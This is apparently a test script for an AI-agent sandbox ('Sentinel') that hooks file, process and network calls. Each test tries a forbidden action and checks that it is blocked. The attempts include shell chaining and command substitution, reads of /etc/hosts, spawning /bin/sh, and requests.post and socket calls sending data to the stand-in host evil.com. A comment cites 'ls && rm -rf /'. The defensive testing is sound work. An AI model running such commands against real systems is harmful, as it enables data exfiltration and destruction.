import sys
import os
import subprocess
import shutil
import requests
import urllib.request as urllib_request
import http.client as http_client
import socket
import io
from pathlib import Path
import builtins
from subprocess import Popen as captured_popen

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import src.core as core
from src.core import (
    activate_sentinel,
    deactivate_sentinel,
    set_approval_handler,
    clear_approval_handler,
)
from src.policy import PolicyEnforcer

activate_sentinel()

print("--- 🛡️ VERIFICATION START ---")

fake_workspace_dir = Path(os.path.abspath("./workspace_fake"))

# TEST 1: The "Fake Workspace" Attack
# Old Vulnerability: allowed_path="./workspace" matched "./workspace_fake"
print("\n[TEST 1] Testing Path Traversal (Fake Workspace)...")
fake_path = fake_workspace_dir / "secret.txt"
try:
    # Ensure directory exists for the test to be valid logic-wise
    os.makedirs(os.path.dirname(str(fake_path)), exist_ok=True)
    with open(str(fake_path), "w") as f:
        f.write("I should not be able to write here.")
    print("❌ FAILED: Agent wrote to fake workspace!")
except Exception as e:
    print(f"✅ PASSED: Blocked write to {fake_path}")
    print(f"   Reason: {e}")

# TEST 1B: io.open should be intercepted too (no bypass)
print("\n[TEST 1B] Testing io.open interception...")
try:
    with io.open("/etc/hosts", "r", encoding="utf-8") as f:
        _ = f.readline()
    print("❌ FAILED: io.open bypassed Sentinel file policy!")
except Exception as e:
    print("✅ PASSED: io.open is blocked for restricted paths.")
    print(f"   Reason: {e}")

# TEST 1C: os.open should be intercepted too (no bypass)
print("\n[TEST 1C] Testing os.open interception...")
try:
    fd = os.open("/etc/hosts", os.O_RDONLY)
    try:
        _ = os.read(fd, 1)
    finally:
        os.close(fd)
    print("❌ FAILED: os.open bypassed Sentinel file policy!")
except Exception as e:
    print("✅ PASSED: os.open is blocked for restricted paths.")
    print(f"   Reason: {e}")

# TEST 2: The "Shell Chaining" Attack
# Old Vulnerability: "ls && rm -rf /" passed because it started with "ls"
print("\n[TEST 2] Testing Shell Injection (&& chaining)...")
try:
    subprocess.run("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: Shell chaining executed!")
except Exception as e:
    print(f"✅ PASSED: Blocked shell chaining.")
    print(f"   Reason: {e}")

# TEST 3: subprocess.Popen interception
print("\n[TEST 3] Testing subprocess.Popen interception...")
try:
    subprocess.Popen("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: subprocess.Popen chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked subprocess.Popen chaining.")
    print(f"   Reason: {e}")

# TEST 3B: captured pre-activation Popen reference should still be intercepted
print("\n[TEST 3B] Testing captured Popen reference interception...")
try:
    captured_popen("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: Captured pre-activation Popen reference bypassed policy!")
except Exception as e:
    print("✅ PASSED: Captured pre-activation Popen reference is blocked.")
    print(f"   Reason: {e}")

# TEST 4: os.system interception
print("\n[TEST 4] Testing os.system interception...")
try:
    os.system("ls && echo 'Hacked'")
    print("❌ FAILED: os.system chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked os.system chaining.")
    print(f"   Reason: {e}")

# TEST 4B: os.posix_spawn interception (if available)
print("\n[TEST 4B] Testing os.posix_spawn interception...")
if hasattr(os, "posix_spawn"):
    try:
        os.posix_spawn("/bin/sh", ["/bin/sh", "-c", "echo Hacked"], {})
        print("❌ FAILED: os.posix_spawn command executed!")
    except Exception as e:
        print("✅ PASSED: Blocked os.posix_spawn command.")
        print(f"   Reason: {e}")
else:
    print("ℹ️ SKIPPED: os.posix_spawn not available on this platform.")

# TEST 4C: os.spawnlp interception (if available)
print("\n[TEST 4C] Testing os.spawnlp interception...")
if hasattr(os, "spawnlp"):
    try:
        os.spawnlp(os.P_WAIT, "sh", "sh", "-c", "echo Hacked")
        print("❌ FAILED: os.spawnlp command executed!")
    except Exception as e:
        print("✅ PASSED: Blocked os.spawnlp command.")
        print(f"   Reason: {e}")
else:
    print("ℹ️ SKIPPED: os.spawnlp not available on this platform.")

# TEST 5: requests.post interception
print("\n[TEST 5] Testing requests.post network interception...")
try:
    requests.post("http://evil.com", json={"x": 1})
    print("❌ FAILED: requests.post to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked requests.post to disallowed host.")
    print(f"   Reason: {e}")

# TEST 5B: urllib interception
print("\n[TEST 5B] Testing urllib.request interception...")
try:
    urllib_request.urlopen("http://evil.com", timeout=1)
    print("❌ FAILED: urllib.request to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked urllib.request to disallowed host.")
    print(f"   Reason: {e}")

# TEST 5C: http.client interception
print("\n[TEST 5C] Testing http.client interception...")
conn = http_client.HTTPConnection("evil.com", timeout=1)
try:
    conn.request("GET", "/")
    print("❌ FAILED: http.client request to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked http.client request to disallowed host.")
    print(f"   Reason: {e}")
finally:
    conn.close()

# TEST 5D: optional socket.connect fail-safe
print("\n[TEST 5D] Testing optional socket.connect fail-safe...")
previous_socket_failsafe = core.socket_failsafe_enabled
try:
    deactivate_sentinel()
    core.socket_failsafe_enabled = True
    activate_sentinel()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(1)
        sock.connect(("evil.com", 80))
        print("❌ FAILED: socket.connect to blocked host executed!")
    except Exception as e:
        print("✅ PASSED: Blocked socket.connect to disallowed host.")
        print(f"   Reason: {e}")
    finally:
        sock.close()

    # connect_ex should also be blocked (it previously bypassed connect hook).
    sock_ex = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock_ex.settimeout(1)
        rc = sock_ex.connect_ex(("evil.com", 80))
        if rc == 0:
            print("❌ FAILED: socket.connect_ex to blocked host succeeded!")
        else:
            print("✅ PASSED: socket.connect_ex to disallowed host blocked.")
            print(f"   Return code: {rc}")
    except Exception as e:
        print("✅ PASSED: socket.connect_ex blocked with exception.")
        print(f"   Reason: {e}")
    finally:
        sock_ex.close()

    # UDP sendto without connect should also be blocked.
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock_udp.settimeout(1)
        sock_udp.sendto(b"x", ("evil.com", 53))
        print("❌ FAILED: socket.sendto to blocked host executed!")
    except Exception as e:
        print("✅ PASSED: socket.sendto to disallowed host blocked.")
        print(f"   Reason: {e}")
    finally:
        sock_udp.close()

    # Ensure judge endpoint exemption is strict to endpoint port only.
    sock_local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock_local.settimeout(1)
        sock_local.connect(("localhost", 22))
        print("❌ FAILED: socket.connect to localhost:22 was allowed by judge-host exemption!")
    except PermissionError as e:
        print("✅ PASSED: localhost:22 blocked (judge exemption does not apply).")
        print(f"   Reason: {e}")
    except Exception as e:
        print(f"❌ FAILED: Expected policy block for localhost:22, got runtime error: {e}")
    finally:
        sock_local.close()
finally:
    deactivate_sentinel()
    core.socket_failsafe_enabled = previous_socket_failsafe
    activate_sentinel()

# TEST 5E: judge host should not be globally exempt (only exact endpoint)
print("\n[TEST 5E] Testing strict judge endpoint exemption...")
try:
    requests.get("http://localhost:9", timeout=1)
    print("❌ FAILED: localhost:9 was allowed by over-broad judge exemption!")
except PermissionError as e:
    print("✅ PASSED: localhost:9 blocked (not the exact judge endpoint).")
    print(f"   Reason: {e}")
except Exception as e:
    print(f"❌ FAILED: Expected policy block for localhost:9, got runtime error: {e}")

print("\n[TEST 5F] Testing exact judge endpoint remains allowed...")
try:
    requests.post("http://localhost:11434/api/generate", json={"model": "x", "prompt": "safe"}, timeout=1)
    print("✅ PASSED: Exact judge endpoint request executed.")
except PermissionError as e:
    print(f"❌ FAILED: Exact judge endpoint was blocked: {e}")
except Exception as e:
    # Connection issues are fine; this checks policy path, not endpoint availability.
    print(f"✅ PASSED: Exact judge endpoint not blocked by policy (runtime error: {type(e).__name__}).")

print("\n[TEST 5G] Testing host mismatch with judge port/path is blocked...")
try:
    requests.get("http://evil.com:11434/api/generate", timeout=1)
    print("❌ FAILED: Non-judge host with judge port/path was allowed!")
except PermissionError as e:
    print("✅ PASSED: Non-judge host blocked even when port/path match judge endpoint.")
    print(f"   Reason: {e}")
except Exception as e:
    print(f"❌ FAILED: Expected policy block for evil.com judge-like URL, got runtime error: {e}")

# TEST 6: shell-aware parsing should allow quoted operator characters
print("\n[TEST 6] Testing quoted shell operators are not misdetected...")
try:
    subprocess.run('echo "a|b"', shell=True, check=True, capture_output=True, text=True)
    print("✅ PASSED: Quoted pipe character allowed.")
except Exception as e:
    print(f"❌ FAILED: Quoted pipe was incorrectly blocked: {e}")

# TEST 7: list-form command with shell=False should not treat && as shell chain
print("\n[TEST 7] Testing argv mode does not over-block symbolic args...")
try:
    subprocess.run(["echo", "a&&b"], shell=False, check=True, capture_output=True, text=True)
    print("✅ PASSED: argv mode allowed symbolic argument.")
except Exception as e:
    print(f"❌ FAILED: argv mode incorrectly blocked symbolic arg: {e}")

# TEST 7B: command substitution should be blocked for shell=True
print("\n[TEST 7B] Testing command substitution with $() is blocked...")
try:
    subprocess.run("echo $(echo hacked)", shell=True, check=True, capture_output=True, text=True)
    print("❌ FAILED: Command substitution via $() executed!")
except Exception as e:
    print("✅ PASSED: Blocked command substitution via $().")
    print(f"   Reason: {e}")

# TEST 7C: backtick substitution should be blocked for shell=True
print("\n[TEST 7C] Testing command substitution with backticks is blocked...")
try:
    subprocess.run("echo `echo hacked`", shell=True, check=True, capture_output=True, text=True)
    print("❌ FAILED: Command substitution via backticks executed!")
except Exception as e:
    print("✅ PASSED: Blocked command substitution via backticks.")
    print(f"   Reason: {e}")

# TEST 7D: fail-safe should block interpreters even if misconfigured as allowed
print("\n[TEST 7D] Testing fail-safe blocks interpreter base commands...")
try:
    enforcer = PolicyEnforcer()
    enforcer.policy.setdefault("allowed_commands", [])
    if "python" not in enforcer.policy["allowed_commands"]:
        enforcer.policy["allowed_commands"].append("python")
    enforcer.check_command(["python", "-c", "print('ok')"], shell=False)
    print("❌ FAILED: Interpreter command allowed after accidental whitelist!")
except Exception as e:
    print("✅ PASSED: Fail-safe blocked interpreter command despite whitelist.")
    print(f"   Reason: {e}")

# TEST 8: policy loading should not depend on current working directory
print("\n[TEST 8] Testing CWD-independent policy loading...")
original_cwd = os.getcwd()
try:
    os.chdir(Path(__file__).resolve().parents[2])
    enforcer = PolicyEnforcer()
    if enforcer.policy.get("allowed_paths"):
        print("✅ PASSED: Policy loaded correctly outside sentinel-guard CWD.")
    else:
        print("❌ FAILED: Policy loaded empty outside sentinel-guard CWD.")
finally:
    os.chdir(original_cwd)

# TEST 9: activation idempotency
print("\n[TEST 9] Testing activate_sentinel idempotency...")
before_open = builtins.open
before_io_open = io.open
before_path_open = Path.open
before_os_open = os.open
before_run = subprocess.run
before_session_request = requests.sessions.Session.request
before_socket_connect = socket.socket.connect
before_socket_connect_ex = socket.socket.connect_ex
before_socket_sendto = socket.socket.sendto
before_popen_init = core._original_popen.__init__
before_posix_spawn = getattr(os, "posix_spawn", None)
before_posix_spawnp = getattr(os, "posix_spawnp", None)
before_spawnlp = getattr(os, "spawnlp", None)
before_execvp = getattr(os, "execvp", None)
activate_sentinel()
after_open = builtins.open
after_io_open = io.open
after_path_open = Path.open
after_os_open = os.open
after_run = subprocess.run
after_session_request = requests.sessions.Session.request
after_socket_connect = socket.socket.connect
after_socket_connect_ex = socket.socket.connect_ex
after_socket_sendto = socket.socket.sendto
after_popen_init = core._original_popen.__init__
after_posix_spawn = getattr(os, "posix_spawn", None)
after_posix_spawnp = getattr(os, "posix_spawnp", None)
after_spawnlp = getattr(os, "spawnlp", None)
after_execvp = getattr(os, "execvp", None)
if (
    before_open is after_open
    and before_io_open is after_io_open
    and before_path_open is after_path_open
    and before_os_open is after_os_open
    and before_run is after_run
    and before_session_request is after_session_request
    and before_socket_connect is after_socket_connect
    and before_socket_connect_ex is after_socket_connect_ex
    and before_socket_sendto is after_socket_sendto
    and before_popen_init is after_popen_init
    and before_posix_spawn is after_posix_spawn
    and before_posix_spawnp is after_posix_spawnp
    and before_spawnlp is after_spawnlp
    and before_execvp is after_execvp
):
    print("✅ PASSED: Repeated activation does not stack/replace patches.")
else:
    print("❌ FAILED: Repeated activation changed patched function references.")

# TEST 10: deactivation restores original runtime behavior
print("\n[TEST 10] Testing deactivate_sentinel restoration...")
deactivate_sentinel()
restored = (
    builtins.open is core._original_open
    and io.open is core._original_io_open
    and Path.open is core._original_path_open
    and os.open is core._original_os_open
    and subprocess.run is core._original_run
    and subprocess.Popen is core._original_popen
    and core._original_popen.__init__ is core._original_popen_init
    and os.system is core._original_os_system
    and getattr(os, "posix_spawn", None) is core._original_posix_spawn
    and getattr(os, "posix_spawnp", None) is core._original_posix_spawnp
    and getattr(os, "spawnlp", None) is core._ORIGINAL_SPAWN_FNS["spawnlp"]
    and getattr(os, "execvp", None) is core._ORIGINAL_EXEC_FNS["execvp"]
    and requests.sessions.Session.request is core._original_session_request
    and socket.socket.connect is core._original_socket_connect
    and socket.socket.connect_ex is core._original_socket_connect_ex
    and socket.socket.sendto is core._original_socket_sendto
)
if not restored:
    print("❌ FAILED: Deactivation did not restore all original functions.")
else:
    print("✅ PASSED: Deactivation restored original runtime functions.")
    try:
        # 'pwd' is not whitelisted while sentinel is active; this should run when deactivated.
        subprocess.run("pwd", shell=True, check=True, capture_output=True, text=True)
        print("✅ PASSED: Command execution no longer intercepted after deactivation.")
    except Exception as e:
        print(f"❌ FAILED: Command still appears intercepted after deactivation: {e}")

# Reactivate so script finishes in a protected state for consistency.
activate_sentinel()

# TEST 11: approval workflow for blocked file access
print("\n[TEST 11] Testing approval workflow for blocked file access...")
approval_test_path = fake_workspace_dir / "approved_by_user.txt"
set_approval_handler(lambda alert: alert.action == "file_access")
try:
    os.makedirs(os.path.dirname(str(approval_test_path)), exist_ok=True)
    with open(str(approval_test_path), "w") as f:
        f.write("approved")
    print("✅ PASSED: User approval allowed blocked file access.")
except Exception as e:
    print(f"❌ FAILED: Approved file access was still blocked: {e}")
finally:
    clear_approval_handler()

# Confirm default behavior returns to block after handler is cleared
print("\n[TEST 12] Testing default rejection when approval handler is cleared...")
try:
    with open(str(fake_workspace_dir / "should_block_again.txt"), "w") as f:
        f.write("blocked")
    print("❌ FAILED: File access was allowed without approval handler!")
except Exception as e:
    print("✅ PASSED: File access blocked again after clearing handler.")
    print(f"   Reason: {e}")

# Teardown: cleanup test artifact if it exists.
if fake_workspace_dir.exists() and fake_workspace_dir.is_dir():
    try:
        set_approval_handler(
            lambda alert: alert.action == "file_access" and str(fake_workspace_dir) in str(alert.target)
        )
        shutil.rmtree(fake_workspace_dir)
        clear_approval_handler()
        print(f"\n[TEARDOWN] Removed test artifact: {fake_workspace_dir}")
    except Exception as e:
        clear_approval_handler()
        print(f"\n[TEARDOWN] Could not remove {fake_workspace_dir}: {e}")

print("\n--- 🛡️ VERIFICATION END ---")
